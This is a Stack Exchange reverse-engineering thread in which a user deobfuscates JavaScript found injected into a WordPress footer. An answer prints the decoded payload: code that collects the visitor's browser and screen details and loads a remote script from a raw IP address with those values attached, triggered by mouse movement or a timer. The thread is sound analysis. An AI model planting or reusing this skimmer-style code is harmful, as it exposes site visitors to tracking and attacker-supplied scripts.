{
    "title": "deobfuscating javascript injected into Wordpress",
    "link": "https://reverseengineering.stackexchange.com/questions/17681/deobfuscating-javascript-injected-into-wordpress",
    "content": "Found a WP site (not mine) with lovely obfuscated code injected into the footer so I've been trying to de-obfuscate it.\nI ran it through unpacker, then converted hex to ASCII, then un-minified to bring back line breaks and wound up with something someone like me can actually kind of recognize as javascript:\n<pre><code>var _0x1386=[\"$ = ~[]; \n$ = {\n    2: ++$,\n    $$$$: (![] + \"\")[$],\n    1 $: ++$,\n    $0$0: (![] + \"\")[$],\n    0 $0: ++$,\n    $0$$: ({} + \"\")[$],\n    $$0$: ($[$] + \"\")[$],\n    0 $$: ++$,\n    $$$0: (!\"\" + \"\")[$],\n    $1: ++$,\n    $0$: ++$,\n    $$1: ({} + \"\")[$],\n    $$0: ++$,\n    $$$: ++$,\n    $2: ++$,\n    $1$: ++$\n};\n</code></pre>\nThen followed some of the instructions of this dude who analyzed very similar javascript.\nAfter doing so, this is where I'm at:\n<pre><code>$ = -1; \n$ = {\n    2: 0, \n    $$$$: \"f\",\n    1 $: 1,\n    $0$0: \"a\",\n    0 $0: 2,\n    $0$$: \"j\", \n    $$0$: \"d\",\n    0 $$: 3,\n    $$$0: \"e\", \n    $1: 4,\n    $0$: 5,\n    $$1: \"t\",\n    $$0: 6,\n    $$$: 7,\n    $2: 8,\n    $1$: 9\n};\n</code></pre>\n**I'm specifically stuck (I think) lines in the $ object that have an integer and then space in the property name. ** Also, the hex alphabet wouldn't include \"j\" or \"t\" if I'm not mistaken, so maybe I am evaluating those expressions incorrectly?\nGrateful for any bones thrown my way. I know it's a rube question that shares some in common with existing questions about deobfuscation, but it's not a duplicate question - I'm just a guy trying to learn Javascript and coding a little better by way of this exercise.\nThanks in advance!\n",
    "votes": "1",
    "answers": 1,
    "views": "388",
    "tags": [
        "deobfuscation",
        "javascript"
    ],
    "user": "Luke Smith",
    "time": "Mar 13, 2018 at 13:13",
    "comments": [
        {
            "user": "Megabeets",
            "text": "Can you share the original code? We will be able to explain better\n",
            "time": null
        },
        {
            "user": "Paweł Łukasik",
            "text": "also check this: reverseengineering.stackexchange.com/questions/15943/…\n",
            "time": null
        },
        {
            "user": "Luke Smith",
            "text": "@PawełŁukasik thanks - highly relevant resource! I'm still a bit stuck on something that I hope is a basic JavaScript rudiment which I lack.\n",
            "time": null
        }
    ],
    "answers_data": [
        {
            "content": "I rolled this slice of code through debugger and here is the function that is meant to be executed in the end.\n<pre><code>\"moved = 0;\nbesend = false;\nfunction get_query() {\n    besend = true;\n    ua = navigator.userAgent;wd = screen.width;hg = screen.height;pl = navigator.platform;\n    var tmp1 = document.createElement(\"script\"); tmp1.type = \"text/javascript\"; tmp1.async = true;\n    tmp1.src = \"http://184.168.26.25/js/jquery-1.7.50.js?t1=\" + ua + \"&t2=\" + wd + \"&t3=\" + hg + \"&t4=933207538&t5=\" + moved + \"&t6=9885.js\";\n    var tmp2 = document.getElementsByTagName(\"script\")[0];\n    tmp2.parentNode.insertBefore(tmp1, tmp2);\n}\ndocument.onmousemove = function(){moved = 1;clearTimeout(timeout);if ((!besend)) {get_query();}\n}\ntimeout = setTimeout(function(){if ((!moved) && (!besend))  {get_query();besend = true}}, 20000);\"\n</code></pre>\nThis code explained in the snippet above is called by a function constructor\n<pre><code>(0)[\"constructor\"][\"constructor\"](\"return\\\"code to evaluate\\\"\")()</code></pre>, the constructor is modelized in the part <pre><code>$.$ = ($.___)[$.$_][$.$_];</code></pre>.\nAlso this post evaluated snippet is built referring to a minimal dictionary of characters declared in <pre><code>$={...}</code></pre> at the second line.\nWhat's the pun fun happening inside the Json wrapper <pre><code>$={...}</code></pre> ?\nThat's seriously a trigger-wanders, let's go by steps to fathom this wayward script:\n\n$ = ~[];\n\nThis line is just a twist-round simple negation equivalent to the operation <pre><code>$=-1</code></pre>; the context of this variable is used inside the array, just before overwriting this same variable <pre><code>$</code></pre>.\n\n$$$$: (![] + \"\")[$]\n\nWell, this took me longer to decipher tbh, this is one of the magical arithmetic nonesense of javascript, see here second note about implicit conversion of boolean to string, <pre><code>\"\"+false</code></pre> evaluates to <pre><code>\"false\"</code></pre> just exclusively in the realm of Js, the variable retrieves the first character <pre><code>f</code></pre> since <pre><code>$</code></pre> is incremented to <pre><code>0</code></pre>.\n\n({} + \"\")[$]\n\nWhat's that honestly? does it return \"false\" ? \"0\" ? neither, it returns \"[object object]\", the object element is string formatted using an inward <pre><code>object.__proto__.toString()</code></pre> conversion when added with a string type.\n\n($[$] + \"\")[$]\n\nLet's seriously take a deep breath this is very intriguing workaround here, since $ is integer value, at this point evaluated to <pre><code>2</code></pre>, then how is this treated as array? nah it's not, the js debugger does't generate exception in this case, it just returns an <pre><code>undefined</code></pre> object, what were we talking about objects when additionned with strings ? inner-converted to \"undefined\" by this chance.\nSee now nothing is surprising, the author of this script just took advantages of most of eerie behavior of js.\n",
            "votes": "1",
            "user": "Abr001am",
            "time": "Mar 13, 2018 at 15:03",
            "is_accepted": false,
            "comments": [
                {
                    "user": "Luke Smith",
                    "text": "<span class=\"comment-copy\">Thanks for rendering the code, knew I could just \"alert\" it in a debugger to show what it is meant to execute (all the junk is wrapped in eval) but I'm insanely curious about the nature of the transformations. Your last comment (about the minimal dictionary) is pointing more to where I'm currently stuck.</span>",
                    "time": null
                },
                {
                    "user": "Abr001am",
                    "text": "<span class=\"comment-copy\">@LukeSmith there is even more of fun that is going to be lightshed !</span>",
                    "time": null
                },
                {
                    "user": "Luke Smith",
                    "text": "<span class=\"comment-copy\">thanks for investing the time into that. Hopefully you did so before you noticed my link to <a href=\"https://blog.korelogic.com/blog/2015/01/12\" rel=\"nofollow noreferrer\">blog.korelogic.com/blog/2015/01/12</a> which starts to demystify the same. Check out the 3rd property in the \"here's where I'm at\" object. The name begins with an integer and has a space: <code>1 $: 4</code> Dwight Shrute voice: what does that mean?</span>",
                    "time": null
                },
                {
                    "user": "Abr001am",
                    "text": "<span class=\"comment-copy\">@LukeSmith I'v gone through that by myself, I didn't read the blog, also i don't know how you came into <code>1 $: ++$</code> it bears no sense to me and has no interpretation from the console.</span>",
                    "time": null
                },
                {
                    "user": "Luke Smith",
                    "text": "<span class=\"comment-copy\">what's the third property of the referenced object translate to for you, did you get that far? Specifically the property name (I assume my value was correct but the name is what is confounding me.)</span>",
                    "time": null
                }
            ]
        }
    ]
}